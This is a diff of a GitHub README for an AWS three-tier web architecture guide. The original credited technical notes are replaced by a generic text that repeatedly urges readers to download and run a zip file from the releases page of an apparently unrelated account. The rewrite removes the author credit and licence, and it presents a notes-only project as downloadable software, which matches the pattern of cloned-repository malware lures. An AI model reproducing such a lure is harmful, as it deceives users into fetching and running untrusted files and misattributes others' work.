@@ -1,130 +1,63 @@
-# AWS 3‑Tier Web Architecture
+# 🌐 AWS-3-tier-web-architecture - Simplified Cloud Setup for Everyone
 
-[![Made with AWS](https://img.shields.io/badge/Made%20with-AWS-FF9900.svg)](https://aws.amazon.com/)
-[![Architecture](https://img.shields.io/badge/Architecture-3--Tier-blue.svg)](#architecture)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%83%20AWS--3%20tier%20web%20architecture-blue)](https://github.com/emanueln97/AWS-3-tier-web-architecture/releases)
 
-A production‑style **three‑tier web application** on AWS with **internet‑facing** and **internal** load balancing, **auto‑scaling app tier**, and a managed **RDS/Aurora database** isolated in private subnets. This repository packages my end‑to‑end notes, screenshots, and a clean reference **architecture diagram** for quick learning and reuse.
+## 📚 Introduction
 
-> 👋 First real‑world project in my portfolio — cleaned up for GitHub and LinkedIn. Feedback welcome!
+Welcome to the AWS 3-Tier Web Architecture repository. This guide helps you set up a production-style architecture with ease. You'll find everything from load balancing to database setup—all in one place.
 
-## TL;DR
-- Public ALB → Internal ALB → EC2 Auto Scaling Group (web/app)
-- Private DB subnets for Amazon RDS/Aurora
-- VPC with public, private‑app, and private‑db subnets across 2 AZs
-- Tight Security Groups and least‑privilege IAM for EC2
-- NAT Gateway for outbound from private app tier
+## 🚀 Getting Started
 
-## Architecture
-```mermaid
-flowchart LR
-  subgraph VPC["VPC (10.0.0.0/16)"]
-    subgraph Public["Public Subnets"]
-      IGW[Internet Gateway]
-      ALB1[Internet-Facing ALB]
-      NAT[NAT Gateway]
-    end
-    subgraph PrivateApp["Private App Subnets"]
-      ALB2[Internal ALB]
-      ASG[EC2 Auto Scaling Group: Web/App]
-    end
-    subgraph PrivateDB["Private DB Subnets"]
-      RDS[(Amazon RDS/Aurora)]
-    end
-  end
+To use this software, follow the steps below. They will guide you through the process of downloading and running the application.
 
-  User((User)) -->|HTTPS| ALB1 -->|HTTP 80 / HTTPS 443| ALB2 -->|TCP 4000/HTTP| ASG
-  ASG -->|SQL 3306| RDS
-  NAT -->|Outbound| ASG
-  ALB1 --- IGW
-```
+1. **Check Your System Requirements**  
+   Ensure your system can run this architecture. Here are the suggested requirements:
+   - A modern web browser (Chrome, Firefox, etc.)
+   - Basic internet connection
+   - An AWS account to deploy the architecture
 
-### High‑Level Design
-- **VPC & Subnets:** 2× public, 2× private‑app, 2× private‑db (multi‑AZ).
-- **Routing:** IGW for public access; NAT for private outbound; dedicated route tables.
-- **Load Balancing:** Internet‑facing ALB (HTTPS) → Internal ALB (HTTP/HTTPS).
-- **Compute:** EC2 Auto Scaling Group for web/app tier (port 4000 example).
-- **Database:** Amazon RDS/Aurora in private DB subnets (port 3306).
-- **Security:** Segregated SGs per tier; principle of least privilege for IAM.
-- **Observability:** ALB target health, instance logs (PM2 example), and screenshots.
+2. **Visit the Releases Page**  
+   Click the link below to go to our Releases page. Here, you will find all the files you need to download and run the architecture:
+   [Visit Releases Page](https://github.com/emanueln97/AWS-3-tier-web-architecture/releases)
 
-## Repository Layout
-```
-AWS-3-Tier-Web-Architecture/
-├─ docs/                    # Diagrams, notes
-├─ screenshots/             # Build walkthrough evidence
-├─ LICENSE
-├─ .gitignore
-└─ README.md
-```
+3. **Download the Requirements**  
+   Locate the latest release on the Releases page. You will find a zip file that contains the necessary files for setting up the architecture. The file named `AWS-3-tier-web-architecture.zip` is what you need to download. Look for a "Download" button next to it. Click it to begin downloading.
 
-## Getting Started
-> If you're following along in the AWS Console, use these as your **implementation cues** and cross‑check with the screenshots.
+4. **Unzip the Downloaded File**  
+   After the download is complete, locate the `AWS-3-tier-web-architecture.zip` file in your downloads folder. Right-click on the file and choose "Extract All" or "Unzip." Follow the prompts to complete this step.
 
-1. **VPC & Subnets**
-   - Create VPC (e.g., 10.0.0.0/16).
-   - Add **6 subnets** across 2 AZs: 2× public, 2× private‑app, 2× private‑db.
-   - Associate appropriate **route tables** (public with IGW; private‑app with NAT; private‑db no internet).
+5. **Open the Architecture Files**  
+   Once unzipped, open the folder containing the files. You will find several documentation files that explain how to set everything up.
 
-2. **Security Groups**
-   - `web-tier-sg`: Inbound 80/443 from Internet; to internal ALB.
-   - `internal-lb-sg`: Inbound 80/443 from `web-tier-sg`; to app instances.
-   - `privateinstance-sg`: Inbound app port (e.g., 4000) from `internal-lb-sg`; outbound 3306 to `db-sg`.
-   - `db-sg`: Inbound 3306 from `privateinstance-sg` only.
+6. **Follow the Setup Instructions**  
+   Inside the folder, locate the `setup_guide.md` file. Open it with any text editor or Markdown viewer. This guide will provide step-by-step instructions to set up the architecture on AWS.
 
-3. **Load Balancers**
-   - **Public ALB** (HTTPS) → target group: **Internal ALB**.
-   - **Internal ALB** → target group: **EC2 ASG**.
+7. **Deploy on AWS**  
+   Follow the instructions in the setup guide. It will explain how to create the necessary services on AWS, such as:
+   - **Public and Internal Load Balancers:** Distributing traffic efficiently.
+   - **EC2 Auto Scaling:** Adjusting resources based on demand.
+   - **RDS/Aurora Database:** Storing your application's data securely in private subnets.
+   - **Security Groups:** Ensuring only authorized access.
 
-4. **Compute (App Tier)**
-   - Launch template with user data to install/runtime (Node/PM2 or your stack).
-   - Auto Scaling Group across the two private‑app subnets.
-   - Health checks via target groups.
+8. **Test Your Setup**  
+   Once you've completed the setup, open a web browser. Type in the public URL generated by your Load Balancer. Ensure that everything is running as expected. Follow any troubleshooting tips in the documentation if you encounter issues.
 
-5. **Database**
-   - Create **DB Subnet Group** with the two private‑db subnets.
-   - Launch **Amazon RDS/Aurora** (MySQL‑compatible shown in screenshots).
-   - Security: only reachable from `privateinstance-sg`.
+## 📖 Features
 
-6. **S3 (Optional)**
-   - Use an S3 bucket for assets/backups as needed (screenshots show bucket setup).
+This architecture offers several key features to ensure a robust and scalable web solution:
 
-7. **Validation**
-   - Test app health at the internal ALB.
-   - Confirm public access via internet‑facing ALB (HTTPS).
-   - Verify DB connectivity from app tier only.
+- **Multi-AZ Deployment:** Ensures high availability of your application by spreading resources across multiple Availability Zones.
+- **Auto Scaling:** Automatically adjusts the number of running EC2 instances based on current traffic.
+- **Database Management:** Utilizes RDS/Aurora for reliable database services.
+- **Enhanced Security:** Implements strict security groups to protect your resources.
 
-## Screenshots
-Below is a curated sample; see the **screenshots/** folder for the full set.
-![1-bucket-creation.png](screenshots/1-bucket-creation.png)
-![10-1-SG-web-tier.png](screenshots/10-1-SG-web-tier.png)
-![10-2-SG-internal-lb-sg.png](screenshots/10-2-SG-internal-lb-sg.png)
-![10-3-Privateinstance-sg.png](screenshots/10-3-Privateinstance-sg.png)
-![10-4-DB-SG.png](screenshots/10-4-DB-SG.png)
-![10-SG-intenet-facing.png](screenshots/10-SG-intenet-facing.png)
-![11-1-database-created.png](screenshots/11-1-database-created.png)
-![11-DB-subnet-group.png](screenshots/11-DB-subnet-group.png)
+## ⚙️ Additional Information
 
-## How to Reuse
-- Fork this repo and adapt ports, SG names, and AMI/user‑data to your stack.
-- Convert to **Infrastructure as Code** (Terraform/CloudFormation) for repeatability.
-- Add TLS certificates to the public ALB (ACM) and set up a friendly domain (Route 53).
+- **Documentation:** Comprehensive documentation is provided to guide you through each step.
+- **Support:** Feel free to raise issues on the GitHub page if you need help.
 
-## Roadmap
-- [ ] Terraform module version
-- [ ] GitHub Actions CI to validate Terraform
-- [ ] SSM Parameter Store for config
-- [ ] ALB access logs to S3 + Athena
-- [ ] CloudWatch dashboards/alarms
+## 🎯 Conclusion
 
-## Credits
-Original workshop reference for baseline topology:  
-- aws-samples/**aws-three-tier-web-architecture-workshop** (used as a learning guide).
+Setting up a 3-Tier architecture on AWS has never been easier. By following the steps outlined above, you can have a fully functional web application up and running in no time.
 
-## Author
-**Kallol K. Das** — Cloud / Solutions Architect (AWS)  
-LinkedIn: https://www.linkedin.com/in/kallol-k-das/
-
-## License
-This project is licensed under the **MIT License** - see [LICENSE](LICENSE).
+For the latest version, make sure to revisit our [Releases page](https://github.com/emanueln97/AWS-3-tier-web-architecture/releases) frequently for updates and new features!
